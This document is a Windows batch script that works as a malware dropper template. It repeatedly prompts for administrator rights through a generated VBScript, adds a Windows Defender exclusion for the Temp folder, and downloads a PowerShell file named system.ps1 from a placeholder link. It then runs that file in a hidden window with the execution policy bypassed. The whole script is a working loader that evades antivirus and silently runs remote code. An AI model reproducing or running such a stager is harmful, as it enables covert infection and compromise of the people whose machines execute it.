@echo off
:: BatchGotAdmin
:-------------------------------------
:checkPrivileges
if exist ".\file.txt" (
    echo WE GOT ADMIN, exiting...
    exit /B
) 

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    goto gotAdmin
)

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    
    timeout /t 1 /nobreak >nul


    goto checkPrivileges

:gotAdmin
    
    

    echo Running with administrative privileges...
    pushd "%CD%"
    CD /D "%~dp0"


powershell powershell.exe -windowstyle hidden "New-Item file.txt"
set "tmp=C:\Users\%username%\AppData\Local\Temp\"
set "url=PASTE_RAW_LINK_TO_system.ps1"
set "fname=system.ps1"

powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%tmp%'"

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri %url% -OutFile %fname%"
powershell powershell.exe -windowstyle hidden -ep bypass "./%fname%"
